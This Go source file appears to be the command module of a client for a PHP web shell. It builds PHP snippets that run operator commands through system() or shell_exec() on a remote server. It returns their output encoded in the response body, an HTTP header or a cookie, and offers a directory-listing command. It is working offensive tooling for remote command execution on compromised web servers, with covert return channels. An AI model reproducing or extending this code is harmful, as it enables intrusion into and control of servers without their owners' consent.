package command

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"network"
	"normalizer"
	"strings"

	"github.com/urfave/cli"
)

type CMD struct {
	_method  int
	_context string
}

func handleNotConnected() {
	fmt.Println("You haven't setup the required information, please refer to srv config")
}

func (c *CMD) Setup() {
	fmt.Println("in progress")
}

func (c *CMD) getSystemCMD(cmd, r string) string {
	return "ob_start();system('" + cmd + "');$" + r + "=ob_get_contents();ob_end_clean();"
}

func (c *CMD) getShellExecCMD(cmd, r string) string {
	return "$" + r + "=shell_exec('" + cmd + "');"
}

func (c *CMD) createCMD(cmd *string, r string) {
	var contexter string

	if c._context != "" {
		contexter = "cd " + c._context + " && "
	}

	shellCMD := contexter + *cmd

	if c._method == 0 {
		shellCMD = c.getSystemCMD(shellCMD, r)
	} else if c._method == 1 {
		shellCMD = c.getShellExecCMD(shellCMD, r)
	}

	*cmd = shellCMD
}

func (c *CMD) getReturn() string {
	var response string

	m := network.NET.GetMethod()
	p := network.NET.GetParameter()

	if m == 0 || m == 1 {
		response = "echo(" + normalizer.PHPEncode("$r") + ");exit();"
	} else if m == 2 {
		response = "header('" + p + ":' . " + normalizer.PHPEncode("$r") + ");exit();"
	} else if m == 3 {
		response = "setcookie('" + p + "', " + normalizer.PHPEncode("$r") + ");exit();"
	}

	return response
}

func (cmd *CMD) Ls(c *cli.Context) {
	if !network.NET.IsSetup() {
		handleNotConnected()
		return
	}

	if c.Bool("raw") {
		ls := "ls " + strings.Join(c.Args(), " ")
		cmd.createCMD(&ls, "a")
		network.NET.Send(ls, lsEnd)

		return
	}

	var context string

	if len(c.Args()) > 0 {
		context = "cd " + c.Args().Get(0) + " && "
	}

	lsFolder := context + "ls -ld */"
	lsFile := context + "ls -lp | grep -v /"

	cmd.createCMD(&lsFolder, "a")
	cmd.createCMD(&lsFile, "b")

	ls := lsFolder + lsFile + "$r=json_encode(array($a, $b));" + cmd.getReturn()

	network.NET.Send(ls, lsEnd)
}

func lsEnd(r *http.Response) {
	defer r.Body.Close()
	buffer, err := ioutil.ReadAll(r.Body)

	if err != nil {
		panic(err)
	}

	base64 := string(buffer)
	body := normalizer.Decode(base64)

	fmt.Println(body)
}
